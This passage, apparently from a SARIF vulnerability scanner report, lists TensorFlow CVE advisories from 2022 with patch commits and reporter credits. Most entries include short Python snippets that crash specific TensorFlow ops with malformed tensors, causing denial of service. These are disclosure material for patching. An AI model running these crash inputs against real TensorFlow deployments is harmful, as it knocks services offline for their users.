                "text": "Vulnerability CVE-2022-36026\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-36026](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36026)\n### Impact\nIf `QuantizeAndDequantizeV3` is given a nonscalar `num_bits` input tensor, it results in a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nsigned_input = True\nrange_given = False\nnarrow_range = False\naxis = -1\ninput = tf.constant(-3.5, shape=[1], dtype=tf.float32)\ninput_min = tf.constant(-3.5, shape=[1], dtype=tf.float32)\ninput_max = tf.constant(-3.5, shape=[1], dtype=tf.float32)\nnum_bits = tf.constant([], shape=[0], dtype=tf.int32)\ntf.raw_ops.QuantizeAndDequantizeV3(input=input, input_min=input_min, input_max=input_max, num_bits=num_bits, signed_input=signed_input, range_given=range_given, narrow_range=narrow_range, axis=axis)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [f3f9cb38ecfe5a8a703f2c4a8fead434ef291713](https://github.com/tensorflow/tensorflow/commit/f3f9cb38ecfe5a8a703f2c4a8fead434ef291713).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.",
                "markdown": "**Vulnerability CVE-2022-36026**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-36026](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36026)|\n\n### Impact\nIf `QuantizeAndDequantizeV3` is given a nonscalar `num_bits` input tensor, it results in a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nsigned_input = True\nrange_given = False\nnarrow_range = False\naxis = -1\ninput = tf.constant(-3.5, shape=[1], dtype=tf.float32)\ninput_min = tf.constant(-3.5, shape=[1], dtype=tf.float32)\ninput_max = tf.constant(-3.5, shape=[1], dtype=tf.float32)\nnum_bits = tf.constant([], shape=[0], dtype=tf.int32)\ntf.raw_ops.QuantizeAndDequantizeV3(input=input, input_min=input_min, input_max=input_max, num_bits=num_bits, signed_input=signed_input, range_given=range_given, narrow_range=narrow_range, axis=axis)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [f3f9cb38ecfe5a8a703f2c4a8fead434ef291713](https://github.com/tensorflow/tensorflow/commit/f3f9cb38ecfe5a8a703f2c4a8fead434ef291713).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University."
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35990",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35990"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35990",
              "help": {
                "text": "Vulnerability CVE-2022-35990\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35990](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35990)\n### Impact\nWhen `tf.quantization.fake_quant_with_min_max_vars_per_channel_gradient` receives input `min` or `max` of rank other than 1, it gives a `CHECK` fail that can trigger a denial of service attack.\n```python\nimport tensorflow as tf\narg_0=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)\narg_1=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)\narg_2=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)\narg_3=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)\narg_4=8\narg_5=False\narg_6=None\ntf.quantization.fake_quant_with_min_max_vars_per_channel_gradient(gradients=arg_0, \n            inputs=arg_1, min=arg_2,  max=arg_3, num_bits=arg_4, \n            narrow_range=arg_5, name=arg_6)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [f3cf67ac5705f4f04721d15e485e192bb319feed](https://github.com/tensorflow/tensorflow/commit/f3cf67ac5705f4f04721d15e485e192bb319feed).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by \n - 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology\n - Neophytos Christou, Secure Systems Labs, Brown University\n",
                "markdown": "**Vulnerability CVE-2022-35990**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35990](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35990)|\n\n### Impact\nWhen `tf.quantization.fake_quant_with_min_max_vars_per_channel_gradient` receives input `min` or `max` of rank other than 1, it gives a `CHECK` fail that can trigger a denial of service attack.\n```python\nimport tensorflow as tf\narg_0=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)\narg_1=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)\narg_2=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)\narg_3=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)\narg_4=8\narg_5=False\narg_6=None\ntf.quantization.fake_quant_with_min_max_vars_per_channel_gradient(gradients=arg_0, \n            inputs=arg_1, min=arg_2,  max=arg_3, num_bits=arg_4, \n            narrow_range=arg_5, name=arg_6)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [f3cf67ac5705f4f04721d15e485e192bb319feed](https://github.com/tensorflow/tensorflow/commit/f3cf67ac5705f4f04721d15e485e192bb319feed).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by \n - 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology\n - Neophytos Christou, Secure Systems Labs, Brown University\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-36005",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-36005"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36005",
              "help": {
                "text": "Vulnerability CVE-2022-36005\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-36005](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36005)\n### Impact\nWhen `tf.quantization.fake_quant_with_min_max_vars_gradient` receives input `min` or `max` that is nonscalar, it gives a `CHECK` fail that can trigger a denial of service attack.\n```python\nimport tensorflow as tf\nimport numpy as np \narg_0=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)\narg_1=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)\narg_2=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)\narg_3=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)\narg_4=8\narg_5=False\narg_6=``\ntf.quantization.fake_quant_with_min_max_vars_gradient(gradients=arg_0, inputs=arg_1,\nmin=arg_2, max=arg_3, num_bits=arg_4, narrow_range=arg_5, name=arg_6)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [f3cf67ac5705f4f04721d15e485e192bb319feed](https://github.com/tensorflow/tensorflow/commit/f3cf67ac5705f4f04721d15e485e192bb319feed).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by\n - 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology\n - Neophytos Christou, Secure Systems Labs, Brown University\n",
                "markdown": "**Vulnerability CVE-2022-36005**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-36005](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36005)|\n\n### Impact\nWhen `tf.quantization.fake_quant_with_min_max_vars_gradient` receives input `min` or `max` that is nonscalar, it gives a `CHECK` fail that can trigger a denial of service attack.\n```python\nimport tensorflow as tf\nimport numpy as np \narg_0=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)\narg_1=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)\narg_2=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)\narg_3=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)\narg_4=8\narg_5=False\narg_6=``\ntf.quantization.fake_quant_with_min_max_vars_gradient(gradients=arg_0, inputs=arg_1,\nmin=arg_2, max=arg_3, num_bits=arg_4, narrow_range=arg_5, name=arg_6)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [f3cf67ac5705f4f04721d15e485e192bb319feed](https://github.com/tensorflow/tensorflow/commit/f3cf67ac5705f4f04721d15e485e192bb319feed).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by\n - 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology\n - Neophytos Christou, Secure Systems Labs, Brown University\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-36013",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-36013"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36013",
              "help": {
                "text": "Vulnerability CVE-2022-36013\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-36013](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36013)\n### Impact\nWhen [`mlir::tfg::GraphDefImporter::ConvertNodeDef`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ir/importexport/graphdef_import.cc) tries to convert NodeDefs without an op name, it crashes.\n```cpp\nStatus GraphDefImporter::ConvertNodeDef(OpBuilder \u0026builder, ConversionState \u0026s,\n                                        const NodeDef \u0026node) {\n  VLOG(4) \u003c\u003c \"Importing: \" \u003c\u003c node.name();\n  OperationState state(ConvertLocation(node), absl::StrCat(\"tfg.\", node.op()));\n\n  // The GraphImporter does light shape inference, but here we will defer all of\n  // that to the shape inference pass.\n  const OpDef *op_def;\n  const OpRegistrationData *op_reg_data = nullptr;\n  if ((op_reg_data = registry_.LookUp(node.op()))) {\n    op_def = \u0026op_reg_data-\u003eop_def;\n  } else {\n    auto it = function_op_defs_.find(node.op());\n    if (it == function_op_defs_.end())\n      return InvalidArgument(\"Unable to find OpDef for \", node.op());\n    op_def = it-\u003esecond;\n  }\n```\n`node.op().empty()` cannot be empty.\n\n\n### Patches\nWe have patched the issue in GitHub commit [a0f0b9a21c9270930457095092f558fbad4c03e5](https://github.com/tensorflow/tensorflow/commit/a0f0b9a21c9270930457095092f558fbad4c03e5).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-36013**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-36013](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36013)|\n\n### Impact\nWhen [`mlir::tfg::GraphDefImporter::ConvertNodeDef`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ir/importexport/graphdef_import.cc) tries to convert NodeDefs without an op name, it crashes.\n```cpp\nStatus GraphDefImporter::ConvertNodeDef(OpBuilder \u0026builder, ConversionState \u0026s,\n                                        const NodeDef \u0026node) {\n  VLOG(4) \u003c\u003c \"Importing: \" \u003c\u003c node.name();\n  OperationState state(ConvertLocation(node), absl::StrCat(\"tfg.\", node.op()));\n\n  // The GraphImporter does light shape inference, but here we will defer all of\n  // that to the shape inference pass.\n  const OpDef *op_def;\n  const OpRegistrationData *op_reg_data = nullptr;\n  if ((op_reg_data = registry_.LookUp(node.op()))) {\n    op_def = \u0026op_reg_data-\u003eop_def;\n  } else {\n    auto it = function_op_defs_.find(node.op());\n    if (it == function_op_defs_.end())\n      return InvalidArgument(\"Unable to find OpDef for \", node.op());\n    op_def = it-\u003esecond;\n  }\n```\n`node.op().empty()` cannot be empty.\n\n\n### Patches\nWe have patched the issue in GitHub commit [a0f0b9a21c9270930457095092f558fbad4c03e5](https://github.com/tensorflow/tensorflow/commit/a0f0b9a21c9270930457095092f558fbad4c03e5).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35999",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35999"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35999",
              "help": {
                "text": "Vulnerability CVE-2022-35999\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35999](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35999)\n### Impact\nWhen `Conv2DBackpropInput` receives empty `out_backprop` inputs (e.g. `[3, 1, 0, 1]`), the current CPU/GPU kernels `CHECK` fail (one with dnnl, the other with cudnn). This can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\nimport numpy as np\ninput_sizes = [3, 1, 1, 2]\nfilter = np.ones([1, 3, 2, 3])\nout_backprop = np.ones([3, 1, 0, 3])\nstrides = [1, 1, 2, 1]\npadding = `VALID`\n\ntf.raw_ops.Conv2DBackpropInput(\n   input_sizes = input_sizes,\n   filter = filter,\n   out_backprop = out_backprop,\n   strides = strides,\n   padding = padding\n)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [27a65a43cf763897fecfa5cdb5cc653fc5dd0346](https://github.com/tensorflow/tensorflow/commit/27a65a43cf763897fecfa5cdb5cc653fc5dd0346).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Jingyi Shi.\n",
                "markdown": "**Vulnerability CVE-2022-35999**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35999](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35999)|\n\n### Impact\nWhen `Conv2DBackpropInput` receives empty `out_backprop` inputs (e.g. `[3, 1, 0, 1]`), the current CPU/GPU kernels `CHECK` fail (one with dnnl, the other with cudnn). This can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\nimport numpy as np\ninput_sizes = [3, 1, 1, 2]\nfilter = np.ones([1, 3, 2, 3])\nout_backprop = np.ones([3, 1, 0, 3])\nstrides = [1, 1, 2, 1]\npadding = `VALID`\n\ntf.raw_ops.Conv2DBackpropInput(\n   input_sizes = input_sizes,\n   filter = filter,\n   out_backprop = out_backprop,\n   strides = strides,\n   padding = padding\n)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [27a65a43cf763897fecfa5cdb5cc653fc5dd0346](https://github.com/tensorflow/tensorflow/commit/27a65a43cf763897fecfa5cdb5cc653fc5dd0346).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Jingyi Shi.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35983",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35983"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35983",
              "help": {
                "text": "Vulnerability CVE-2022-35983\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35983](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35983)\n### Impact\nIf `Save` or `SaveSlices` is run over tensors of an unsupported `dtype`, it results in a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\nfilename = tf.constant(\"\")\ntensor_names = tf.constant(\"\")\n# Save\ndata = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=-2021), tf.uint64)\ntf.raw_ops.Save(filename=filename, tensor_names=tensor_names, data=data, )\n# SaveSlices\nshapes_and_slices = tf.constant(\"\")\ndata = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=9712), tf.uint32)\ntf.raw_ops.SaveSlices(filename=filename, tensor_names=tensor_names, shapes_and_slices=shapes_and_slices, data=data, )\n```\n\n### Patches\nWe have patched the issue in GitHub commit [5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4](https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University\n",
                "markdown": "**Vulnerability CVE-2022-35983**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35983](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35983)|\n\n### Impact\nIf `Save` or `SaveSlices` is run over tensors of an unsupported `dtype`, it results in a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\nfilename = tf.constant(\"\")\ntensor_names = tf.constant(\"\")\n# Save\ndata = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=-2021), tf.uint64)\ntf.raw_ops.Save(filename=filename, tensor_names=tensor_names, data=data, )\n# SaveSlices\nshapes_and_slices = tf.constant(\"\")\ndata = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=9712), tf.uint32)\ntf.raw_ops.SaveSlices(filename=filename, tensor_names=tensor_names, shapes_and_slices=shapes_and_slices, data=data, )\n```\n\n### Patches\nWe have patched the issue in GitHub commit [5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4](https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35982",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35982"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35982",
              "help": {
                "text": "Vulnerability CVE-2022-35982\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35982](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35982)\n### Impact\nIf `SparseBincount` is given inputs for `indices`, `values`, and `dense_shape` that do not make a valid sparse tensor, it results in a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\nbinary_output = True\nindices = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int64, seed=-1288)\nvalues = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-9366)\ndense_shape = tf.random.uniform(shape=[0], minval=-10000, maxval=10000, dtype=tf.int64, seed=-9878)\nsize = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)\nweights = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.float32, seed=-10000)\ntf.raw_ops.SparseBincount(indices=indices, values=values, dense_shape=dense_shape, size=size, weights=weights, binary_output=binary_output)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [40adbe4dd15b582b0210dfbf40c243a62f5119fa](https://github.com/tensorflow/tensorflow/commit/40adbe4dd15b582b0210dfbf40c243a62f5119fa).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University\n",
                "markdown": "**Vulnerability CVE-2022-35982**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35982](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35982)|\n\n### Impact\nIf `SparseBincount` is given inputs for `indices`, `values`, and `dense_shape` that do not make a valid sparse tensor, it results in a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\nbinary_output = True\nindices = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int64, seed=-1288)\nvalues = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-9366)\ndense_shape = tf.random.uniform(shape=[0], minval=-10000, maxval=10000, dtype=tf.int64, seed=-9878)\nsize = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)\nweights = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.float32, seed=-10000)\ntf.raw_ops.SparseBincount(indices=indices, values=values, dense_shape=dense_shape, size=size, weights=weights, binary_output=binary_output)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [40adbe4dd15b582b0210dfbf40c243a62f5119fa](https://github.com/tensorflow/tensorflow/commit/40adbe4dd15b582b0210dfbf40c243a62f5119fa).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35963",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35963"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35963",
              "help": {
                "text": "Vulnerability CVE-2022-35963\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35963](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35963)\n### Impact\nThe implementation of `FractionalAvgPoolGrad` does not fully validate the input `orig_input_tensor_shape`. This results in an overflow that results in a  `CHECK` failure which can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\noverlapping = True\norig_input_tensor_shape = tf.constant(-1879048192, shape=[4], dtype=tf.int64)\nout_backprop = tf.constant([], shape=[0,0,0,0], dtype=tf.float64)\nrow_pooling_sequence = tf.constant(1, shape=[4], dtype=tf.int64)\ncol_pooling_sequence = tf.constant(1, shape=[4], dtype=tf.int64)\ntf.raw_ops.FractionalAvgPoolGrad(orig_input_tensor_shape=orig_input_tensor_shape, out_backprop=out_backprop, row_pooling_sequence=row_pooling_sequence, col_pooling_sequence=col_pooling_sequence, overlapping=overlapping)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [03a659d7be9a1154fdf5eeac221e5950fec07dad](https://github.com/tensorflow/tensorflow/commit/03a659d7be9a1154fdf5eeac221e5950fec07dad).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n",
                "markdown": "**Vulnerability CVE-2022-35963**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35963](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35963)|\n\n### Impact\nThe implementation of `FractionalAvgPoolGrad` does not fully validate the input `orig_input_tensor_shape`. This results in an overflow that results in a  `CHECK` failure which can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\noverlapping = True\norig_input_tensor_shape = tf.constant(-1879048192, shape=[4], dtype=tf.int64)\nout_backprop = tf.constant([], shape=[0,0,0,0], dtype=tf.float64)\nrow_pooling_sequence = tf.constant(1, shape=[4], dtype=tf.int64)\ncol_pooling_sequence = tf.constant(1, shape=[4], dtype=tf.int64)\ntf.raw_ops.FractionalAvgPoolGrad(orig_input_tensor_shape=orig_input_tensor_shape, out_backprop=out_backprop, row_pooling_sequence=row_pooling_sequence, col_pooling_sequence=col_pooling_sequence, overlapping=overlapping)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [03a659d7be9a1154fdf5eeac221e5950fec07dad](https://github.com/tensorflow/tensorflow/commit/03a659d7be9a1154fdf5eeac221e5950fec07dad).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35969",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35969"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35969",
              "help": {
